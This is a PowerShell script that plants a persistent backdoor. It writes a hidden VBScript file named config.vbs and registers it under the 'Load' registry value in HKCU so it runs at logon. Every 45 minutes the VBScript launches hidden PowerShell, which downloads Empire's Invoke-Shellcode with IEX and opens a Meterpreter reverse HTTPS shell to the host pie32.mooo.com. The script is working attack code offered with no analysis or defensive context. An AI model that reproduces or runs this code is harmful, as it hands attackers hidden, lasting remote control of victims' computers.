$text = 'Dim objShell ' +
'Dim waittime : waittime = 45 * 60 * 1000 '+
'do '+ 
'Set objShell = WScript.CreateObject("WScript.Shell") '+
'command = '+ '"C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -WindowStyle Hidden -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString'+"('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1')); "+ 'Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost pie32.mooo.com -Lport 80 -Force" '+
'objShell.Run command,0 '+
'WScript.Sleep(waittime) '+
'loop '+
'Set objShell = Nothing '

$text > 'C:\Users\public\config.vbs'
$file = Get-Item 'C:\Users\public\config.vbs'
$file.Attributes = 'Hidden'
Set-ItemProperty -Path “HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows” -Name “Load” -Value “C:\Users\Public\config.vbs”